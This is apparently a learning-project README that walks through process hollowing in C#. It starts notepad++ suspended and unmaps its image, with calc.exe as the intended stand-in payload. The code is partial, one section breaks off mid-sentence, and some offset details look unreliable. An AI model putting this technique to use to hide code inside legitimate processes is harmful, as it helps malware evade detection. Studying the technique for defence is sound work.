# ProcessInjector.NET
Learning Process Hollowing technique


# TLDR

I want to try to inject a `calculator.exe` into `notepad++.exe` using the `Process Hollowing` technique.

- [Creating our Victim Process](#creating-our-victim-process)
  * [CreateProcessA Parameters](#createprocessa-parameters)
    + [lpApplicationName](#lpapplicationname)
    + [lpCommandLine](#lpcommandline)
    + [lpProcessAttributes](#lpprocessattributes)
    + [lpThreadAttributes](#lpthreadattributes)
    + [bInheritHandles](#binherithandles)
    + [dwCreationFlags](#dwcreationflags)
    + [lpEnvironment](#lpenvironment)
    + [lpStartupInfo](#lpstartupinfo)
    + [lpProcessInformation](#lpprocessinformation)
  * [Code Example](#code-example)
- [Hollowing our Victim Process](#hollowing-our-victim-process)
  * [ZwUnmapViewOfSection Parameters](#zwunmapviewofsection-parameters)
    + [ProcessHandle](#processhandle)
    + [BaseAddress](#baseaddress)
  * [Code Example](#code-example-1)

# Overview of  PROCESS HOLLOWING (A.K.A PROCESS REPLACEMENT AND RUNPE)

Instead of injecting code into a host program (e.g., DLL injection), malware can perform a technique known as process hollowing. Process hollowing occurs when a malware unmaps (hollows out) the legitimate code from memory of the target process, and overwrites the memory space of the target process (e.g., svchost.exe) with a malicious executable.

![image](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt4bd1c915cefd3848/5e2f90f74c16654538e2ce6a/process-injection-techniques-blogs-runpe.gif)

The malware first creates a new process to host the malicious code in `SUSPENDED` mode. This is done by calling `CreateProcess` and setting the Process Creation Flag to `CREATE_SUSPENDED (0x00000004)`. The primary thread of the new process is created in a suspended state, and does not run until the `ResumeThread` function is called. Next, the malware needs to swap out the contents of the legitimate file with its malicious payload. This is done by unmapping the memory of the target process by calling either `ZwUnmapViewOfSection` or `NtUnmapViewOfSection`. These two APIs basically release all memory pointed to by a section. Now that the memory is unmapped, the loader performs `VirtualAllocEx` to allocate new memory for the malware, and uses `WriteProcessMemory` to write each of the malware’s sections to the target process space. The malware calls `SetThreadContext` to point the `entrypoint` to a new code section that it has written. At the end, the malware resumes the suspended thread by calling `ResumeThread` to take the process out of suspended state.

# Creating our Victim Process

In order to achieve it we are first going to create our victim process, in my case,  `notepad++`, in a `SUSPENDED` state. 
In a `SUSPENDED` state, the victim process is loaded from the filesystem into memory but the primary thread does not run until the `ResumeThread` function is called.

We are going to use the `CreateProcessA` function. More details of it can be found [here](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa).

```cpp
BOOL CreateProcessA(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
```

## CreateProcessA Parameters

### lpApplicationName

This represents the process name that we want to create. Weirdly enough, this can be NULL. In the case where this is NULL, the process name must be the first white space–delimited token in the `lpCommandLine` parameter. 

I will go ahead and leave this parameter to be NULL and specify our process name at `lpCommandLine` parameter instead.

### lpCommandLine

Since our `lpApplicationName` is NULL, the first white space–delimited token of the command line specifies the process name. If you are using a long file name that contains a space, use quoted strings to indicate where the file name ends and the arguments begin. Furthermore, if we were to ommit our extension for our process, it will auto append `.exe`. Lets proceed to put the full path of `notepad++.exe` but avoid the extension.

```cs
  string notepadPath = @"D:\Program Files\Notepad++\notepad++";
```

### lpProcessAttributes

A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle to the new process object can be inherited by child processes. If lpProcessAttributes is NULL, the handle cannot be inherited. 

I will be putting it as NULL.

### lpThreadAttributes

A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle to the new thread object can be inherited by child processes. If lpThreadAttributes is NULL, the handle cannot be inherited.

I will be putting it as NULL.

### bInheritHandles
If this parameter is TRUE, each inheritable handle in the calling process is inherited by the new process. If the parameter is FALSE, the handles are not inherited.

I will be putting it as FALSE.

### dwCreationFlags

The flags that control the priority class and the creation of the process. For a list of values, see [Process Creation Flags](https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags).

We want to create a `SUSPENDED` process. Thus we will be using `CREATE_SUSPENDED` which has a value `0x4`.

### lpEnvironment

An environment block consists of a null-terminated block of null-terminated strings. Each string is in the following form:

`name=value\0`
We won't be needing it thus we will set it to NULL.

### lpStartupInfo

A pointer to a [STARTUPINFO](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa) structure.

I ported the structure with the help from [PInvoke.Net StartupInfo](https://www.pinvoke.net/default.aspx/Structures/StartupInfo.html?diff=y).


### lpProcessInformation
A pointer to a [PROCESS_INFORMATION](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-process_information) structure that receives identification information about the new process.

I ported the structure with the help from [PInvoke.Net ProcessInformation](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information).

This is a very important structure as we would be using the thread handles from it.

## Code Example

Let's go ahead and create our victim process in a suspended state.

```cs
static void Main(string[] args)
{
    //Paths to our files
    string notepadPath = @"D:\Program Files\Notepad++\notepad++.exe";
    string virusPath = @"C:\Windows\System32\calc.exe";

    byte[] victimFileBytes = File.ReadAllBytes(notepadPath);
    IntPtr victimFilePointer = Marshal.UnsafeAddrOfPinnedArrayElement(victimFileBytes, 0);


    byte[] virusFileBytes = File.ReadAllBytes(virusPath);
    IntPtr virusFilePointer = Marshal.UnsafeAddrOfPinnedArrayElement(virusFileBytes, 0);

    #region Create Victim Process in Suspended State    
    
    
    PInvoke.STARTUPINFO startupInfo = new PInvoke.STARTUPINFO();
    PInvoke.PROCESS_INFORMATION processInformation = new PInvoke.PROCESS_INFORMATION();

    bool couldNotCreateProcess = !PInvoke.CreateProcess(
                                        lpApplicationName: null,
                                        lpCommandLine: notepadPath,
                                        lpProcessAttributes: IntPtr.Zero,
                                        lpThreadAttributes: IntPtr.Zero,
                                        bInheritHandles: false,
                                        dwCreationFlags: PInvoke.CreationFlags.SUSPENDED,
                                        lpEnvironment: IntPtr.Zero,
                                        lpCurrentDirectory: null,
                                        lpStartupInfo: startupInfo,
                                        lpProcessInformation: processInformation
                                    );
    if (couldNotCreateProcess)
    {
        Console.WriteLine("Failed to create process...");
    }

    Console.WriteLine("Successfully created victim process...");

    #endregion
}
```

![image](https://user-images.githubusercontent.com/12537739/121704357-47d02e00-cb06-11eb-8847-46063bc4c2c2.png)

We have successfully loaded our victim executable to memory, and it is now in a suspended state.

# Getting ImageBase from our victim process



In order to get the `ThreadContext` of our victim process 
# Hollowing our Victim Process

To hollow out our victim process, we need to unmap it from the memory, since its already currently loaded into memory but in a suspended state.

We will be using the function `ZwUnmapViewOfSection`.

More details of it can be found [here](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwunmapviewofsection).

```cpp
NTSYSAPI NTSTATUS ZwUnmapViewOfSection(
  HANDLE ProcessHandle,
  PVOID  BaseAddress
);
```

## ZwUnmapViewOfSection Parameters

### ProcessHandle

Previously, we called the `CreateProcessA` function. This function helps fill up our `PROCESS_INFORMATION` block.

`PROCESS_INFORMATION` contains the handle to our victim process.

Thus we can get the process handle from it using

```cs
IntPtr processHandle = processInformation.hProcess;
```

### BaseAddress

Pointer to the base virtual address of the view to unmap

![image](https://user-images.githubusercontent.com/12537739/121771500-4bb18e00-cba2-11eb-92b7-034b4aefdd38.png)

As we can see from the image above, we need to get to the `COFF Header`. How do we get to the `COFF Header`? 

At the `DOS_HEADER`, we have a 4 byte integer variable called `E_LFANEW`. This is located at an offset `0x3C` from the start of the file.
Thus to get `E_LFANEW`, 

```cs
Int32 e_lfanew = Marshal.ReadInt32(victimeFilePointer, PInvoke.Offsets.E_LFANEW);
```

`E_LFANEW` contains the offset to get to the `COFF Header`.

Once we get to the `COFF Header`, we can see from the image that the `imagebase` is at `0x34` offset away. However, this is for 32-bit applications. For 64-bit applicaations, there are at a offsett `0x30` away.

Hence to get the `imagebase`, I did

```cs
IntPtr imageBasedAddress = new IntPtr(Marshal.ReadInt64(victimeFilePointer, e_lfanew + 0x30));
```

Now that we have the `processHandle` and `imagebase` address, we can now call the `ZwUnmapViewOfSection` function to unmap our victim process from memory.

```cs
PInvoke.ZwUnmapViewOfSection(processHandle, imageBasedAddress);
```

## Code Example

```cs
static void Main(string[] args)
{
    string notepadPath = @"D:\Program Files\Notepad++\notepad++.exe";

    byte[] victimFileBytes = File.ReadAllBytes(notepadPath);
    IntPtr victimeFilePointer = Marshal.UnsafeAddrOfPinnedArrayElement(victimFileBytes, 0);

    PInvoke.STARTUPINFO startupInfo = new PInvoke.STARTUPINFO();
    PInvoke.PROCESS_INFORMATION processInformation = new PInvoke.PROCESS_INFORMATION();

    Console.WriteLine("Stage 1");
    Console.WriteLine($"Creating victim process: {notepadPath}");

    bool couldNotCreateProcess = !PInvoke.CreateProcess(
                                        lpApplicationName: null,
                                        lpCommandLine: notepadPath,
                                        lpProcessAttributes: IntPtr.Zero,
                                        lpThreadAttributes: IntPtr.Zero,
                                        bInheritHandles: false,
                                        dwCreationFlags: PInvoke.CreationFlags.SUSPENDED,
                                        lpEnvironment: IntPtr.Zero,
                                        lpCurrentDirectory: null,
                                        lpStartupInfo: startupInfo,
                                        lpProcessInformation: processInformation
                                    );
    if (couldNotCreateProcess)
    {
        Console.WriteLine("Failed to create victim process...");

    }

    Console.WriteLine($"Successfully created victim process...");


    Console.WriteLine("Stage 2");
    Int32 e_lfanew = Marshal.ReadInt32(victimeFilePointer, PInvoke.Offsets.E_LFANEW);
    Console.WriteLine($"Getting handle to process...");
    IntPtr processHandle = processInformation.hProcess;
    Console.WriteLine($"Found E_LFANEW OFFSet: {e_lfanew}...");
    Console.WriteLine($"Getting imageBasedAddress...");
    IntPtr imageBasedAddress = new IntPtr(Marshal.ReadInt64(victimeFilePointer, e_lfanew + 0x30));
    Console.WriteLine("Beginning Process Hollowing...");

    if(PInvoke.ZwUnmapViewOfSection(processHandle, imageBasedAddress) == PInvoke.NTSTATUS.STATUS_ACCESS_DENIED)
    {
        Console.WriteLine("Failed to unmap section...");
        return;
    }

    Console.WriteLine("Successfully unmapped victim process.");
}
```

![image](https://user-images.githubusercontent.com/12537739/121773946-dfd72180-cbb1-11eb-9338-3ca73ea97228.png)
